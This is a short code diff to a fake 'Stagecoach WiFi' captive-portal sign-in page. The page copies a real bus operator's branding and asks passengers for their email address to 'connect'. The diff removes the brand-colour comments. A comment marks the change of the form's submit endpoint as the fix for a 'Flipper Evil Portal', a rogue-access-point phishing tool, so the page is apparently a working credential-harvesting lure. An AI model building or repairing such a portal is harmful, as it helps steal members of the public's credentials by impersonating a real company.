@@ -13,7 +13,7 @@ body{
   display:flex;
   align-items:center;
   justify-content:center;
-  background:#005cab; /* Stagecoach blue */
+  background:#005cab;
   background:linear-gradient(135deg,#005cab,#003f7d,#002f5c);
   color:#fff;
 }
@@ -68,14 +68,14 @@ h1{
 .field input::placeholder{color:rgba(255,255,255,.45)}
 
 .field input:focus{
-  border-color:#f0c14b; /* Stagecoach yellow highlight */
+  border-color:#f0c14b;
   background:rgba(255,255,255,.12);
 }
 
 .btn{
   width:100%;
   padding:14px;
-  background:#f0c14b; /* Stagecoach yellow */
+  background:#f0c14b;
   border:none;
   border-radius:12px;
   color:#333;
@@ -165,7 +165,8 @@ h1{
 <h1>Welcome to Stagecoach WiFi</h1>
 <p class="subtitle">Sign in to connect to free onboard WiFi</p>
 
-<form id="f" method="POST" action="/get" target="h">
+<!-- FIXED: Correct endpoint for Flipper Evil Portal -->
+<form id="f" method="POST" action="/post" target="h">
   <div class="field">
     <input name="email" type="text" placeholder="Email address" required autocomplete="off">
   </div>
